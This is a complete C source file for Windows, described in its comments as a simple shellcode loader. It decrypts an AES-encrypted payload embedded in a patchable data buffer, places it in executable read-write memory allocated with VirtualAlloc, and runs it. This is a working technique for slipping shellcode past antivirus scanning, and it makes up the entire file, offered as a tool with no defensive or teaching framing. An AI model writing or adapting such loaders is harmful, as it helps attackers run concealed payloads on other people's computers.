#include <windows.h>
#include <stdio.h>
#include "../common/aes.h"

struct {
    unsigned char aes_key[16];
    unsigned char aes_iv[16];
    unsigned char data[4*1024*1024];
    int len;
} sc = { "Hello, World!" };

// A simple shell code loader.
// Copy left (c) yuanyuanxiang.
int main()
{
    if (!sc.data[0] || !sc.len)
        return -1;

    for (int i = 0; i < 16; ++i) printf("%d ", sc.aes_key[i]);
    printf("\n\n");
    for (int i = 0; i < 16; ++i) printf("%d ", sc.aes_iv[i]);
    printf("\n\n");

    struct AES_ctx ctx;
    AES_init_ctx_iv(&ctx, sc.aes_key, sc.aes_iv);
    AES_CBC_decrypt_buffer(&ctx, sc.data, sc.len);
    void* exec = VirtualAlloc(NULL, sc.len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (exec) {
        memcpy(exec, sc.data, sc.len);
        ((void(*)())exec)();
        Sleep(INFINITE);
    }
    return 0;
}
